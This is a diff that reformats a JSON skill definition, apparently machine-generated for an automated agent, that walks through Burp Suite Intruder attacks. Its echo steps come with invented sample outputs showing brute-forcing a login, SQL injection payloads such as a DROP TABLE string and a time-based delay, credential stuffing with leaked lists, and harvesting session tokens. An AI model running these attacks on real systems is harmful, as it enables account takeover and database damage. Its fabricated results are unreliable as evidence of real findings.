@@ -2,33 +2,114 @@
   "name": "burp_suite_intruder",
   "description": "Automated fuzzing, brute force, and parameter testing using Burp Suite Intruder",
   "pattern": "burp.*intruder|burp.*fuzz|burp.*brute|automated.*attack",
-  "parameters": ["target_request", "attack_type", "payload_list"],
+  "parameters": [
+    "target_request",
+    "attack_type",
+    "payload_list"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'Send request to Intruder (Ctrl+I)' && echo 'Select attack positions by highlighting values and clicking Add §'"  ]},
-      "expected_output": {"type": "string", "example": "Intruder configured with attack positions:\n\nPOST /login HTTP/1.1\nHost: testsite.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=§admin§&password=§password123§\n\nAttack positions marked with § symbols:\n  Position 1: username value\n  Position 2: password value\n\nReady to configure payload sets"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo 'Send request to Intruder (Ctrl+I)' && echo 'Select attack positions by highlighting values and clicking Add §'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Intruder configured with attack positions:\n\nPOST /login HTTP/1.1\nHost: testsite.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=§admin§&password=§password123§\n\nAttack positions marked with § symbols:\n  Position 1: username value\n  Position 2: password value\n\nReady to configure payload sets"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'Configure Intruder attack:' && echo 'Attack type: Cluster bomb (tests all combinations)' && echo 'Payload set 1: Load username list (admin, root, user)' && echo 'Payload set 2: Load password list (password, 123456, admin)'"]},
-      "expected_output": {"type": "string", "example": "Intruder attack configured:\n\nAttack type: Cluster bomb\n  Tests all combinations: 3 usernames × 3 passwords = 9 requests\n\nPayload sets:\n  Set 1 (username): admin, root, user\n  Set 2 (password): password, 123456, admin\n\nIntruder will generate requests:\n  1. username=admin&password=password\n  2. username=admin&password=123456\n  3. username=admin&password=admin\n  4. username=root&password=password\n  ...\n  9. username=user&password=admin"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo 'Configure Intruder attack:' && echo 'Attack type: Cluster bomb (tests all combinations)' && echo 'Payload set 1: Load username list (admin, root, user)' && echo 'Payload set 2: Load password list (password, 123456, admin)'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Intruder attack configured:\n\nAttack type: Cluster bomb\n  Tests all combinations: 3 usernames × 3 passwords = 9 requests\n\nPayload sets:\n  Set 1 (username): admin, root, user\n  Set 2 (password): password, 123456, admin\n\nIntruder will generate requests:\n  1. username=admin&password=password\n  2. username=admin&password=123456\n  3. username=admin&password=admin\n  4. username=root&password=password\n  ...\n  9. username=user&password=admin"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'Start attack' && echo 'Monitor results table for successful login'"]},
-      "expected_output": {"type": "string", "example": "Intruder attack running...\n\nResults:\n#  | Payload1 | Payload2   | Status | Length | Response Time\n1  | admin    | password   | 401    | 523    | 234ms\n2  | admin    | 123456     | 401    | 523    | 245ms\n3  | admin    | admin      | 200    | 2847   | 456ms ← Success!\n4  | root     | password   | 401    | 523    | 238ms\n5  | root     | 123456     | 401    | 523    | 241ms\n6  | root     | admin      | 401    | 523    | 239ms\n7  | user     | password   | 401    | 523    | 243ms\n8  | user     | 123456     | 200    | 2847   | 447ms ← Success!\n9  | user     | admin      | 401    | 523    | 237ms\n\nCredentials found:\n  admin:admin (200 OK, 2847 bytes)\n  user:123456 (200 OK, 2847 bytes)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo 'Start attack' && echo 'Monitor results table for successful login'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Intruder attack running...\n\nResults:\n#  | Payload1 | Payload2   | Status | Length | Response Time\n1  | admin    | password   | 401    | 523    | 234ms\n2  | admin    | 123456     | 401    | 523    | 245ms\n3  | admin    | admin      | 200    | 2847   | 456ms ← Success!\n4  | root     | password   | 401    | 523    | 238ms\n5  | root     | 123456     | 401    | 523    | 241ms\n6  | root     | admin      | 401    | 523    | 239ms\n7  | user     | password   | 401    | 523    | 243ms\n8  | user     | 123456     | 200    | 2847   | 447ms ← Success!\n9  | user     | admin      | 401    | 523    | 237ms\n\nCredentials found:\n  admin:admin (200 OK, 2847 bytes)\n  user:123456 (200 OK, 2847 bytes)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'Sniper attack for SQLi fuzzing:' && echo 'Position: GET /search?q=§test§' && echo 'Payload: SQL injection payloads from list'"]},
-      "expected_output": {"type": "string", "example": "Sniper attack for SQLi testing:\n\nTarget: GET /search?q=§payload§ HTTP/1.1\n\nPayloads tested (showing 5 of 50):\n  1. test' OR '1'='1\n  2. test' UNION SELECT NULL--\n  3. test' AND 1=1--\n  4. test'; DROP TABLE users--\n  5. test' WAITFOR DELAY '0:0:5'--\n\nResults analysis:\n  Payload #1: 200 OK, 15234 bytes (much larger - likely vulnerable)\n  Payload #2: 500 Error (SQL syntax error exposed)\n  Payload #3: 200 OK, 523 bytes (normal response)\n  Payload #5: Response time 5234ms (5 second delay detected - time-based SQLi confirmed)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo 'Sniper attack for SQLi fuzzing:' && echo 'Position: GET /search?q=§test§' && echo 'Payload: SQL injection payloads from list'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Sniper attack for SQLi testing:\n\nTarget: GET /search?q=§payload§ HTTP/1.1\n\nPayloads tested (showing 5 of 50):\n  1. test' OR '1'='1\n  2. test' UNION SELECT NULL--\n  3. test' AND 1=1--\n  4. test'; DROP TABLE users--\n  5. test' WAITFOR DELAY '0:0:5'--\n\nResults analysis:\n  Payload #1: 200 OK, 15234 bytes (much larger - likely vulnerable)\n  Payload #2: 500 Error (SQL syntax error exposed)\n  Payload #3: 200 OK, 523 bytes (normal response)\n  Payload #5: Response time 5234ms (5 second delay detected - time-based SQLi confirmed)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'Pitchfork attack for credential stuffing:' && echo 'username=§user1§&password=§pass1§' && echo 'Paired lists: leaked_users.txt + leaked_passwords.txt'"]},
-      "expected_output": {"type": "string", "example": "Pitchfork attack (parallel iteration):\n\nPayload sets:\n  Set 1: alice, bob, charlie, david\n  Set 2: Alice123!, Bob2024, Charlie99, David@Pass\n\nIntruder tests paired credentials:\n  Request 1: alice:Alice123!\n  Request 2: bob:Bob2024\n  Request 3: charlie:Charlie99\n  Request 4: david:David@Pass\n\nResults:\n  alice:Alice123! → 200 OK ✓ Valid credentials\n  bob:Bob2024 → 401 Unauthorized\n  charlie:Charlie99 → 200 OK ✓ Valid credentials\n  david:David@Pass → 401 Unauthorized\n\n2 of 4 credential pairs work - credential stuffing successful"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo 'Pitchfork attack for credential stuffing:' && echo 'username=§user1§&password=§pass1§' && echo 'Paired lists: leaked_users.txt + leaked_passwords.txt'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Pitchfork attack (parallel iteration):\n\nPayload sets:\n  Set 1: alice, bob, charlie, david\n  Set 2: Alice123!, Bob2024, Charlie99, David@Pass\n\nIntruder tests paired credentials:\n  Request 1: alice:Alice123!\n  Request 2: bob:Bob2024\n  Request 3: charlie:Charlie99\n  Request 4: david:David@Pass\n\nResults:\n  alice:Alice123! → 200 OK ✓ Valid credentials\n  bob:Bob2024 → 401 Unauthorized\n  charlie:Charlie99 → 200 OK ✓ Valid credentials\n  david:David@Pass → 401 Unauthorized\n\n2 of 4 credential pairs work - credential stuffing successful"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'Grep - Extract feature:' && echo 'Add grep match for: Set-Cookie' && echo 'Extract session tokens from responses'"]},
-      "expected_output": {"type": "string", "example": "Intruder Grep - Extract configured:\n\nPattern: Set-Cookie: session=([^;]+)\n\nResults with extracted values:\n#  | Username | Password | Status | Extracted Token\n1  | admin    | admin    | 200    | eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n2  | user     | 123456   | 200    | eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n\nExtracted session tokens can be used for further testing\nExport results to CSV with tokens for automated exploitation"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo 'Grep - Extract feature:' && echo 'Add grep match for: Set-Cookie' && echo 'Extract session tokens from responses'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Intruder Grep - Extract configured:\n\nPattern: Set-Cookie: session=([^;]+)\n\nResults with extracted values:\n#  | Username | Password | Status | Extracted Token\n1  | admin    | admin    | 200    | eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n2  | user     | 123456   | 200    | eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n\nExtracted session tokens can be used for further testing\nExport results to CSV with tokens for automated exploitation"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
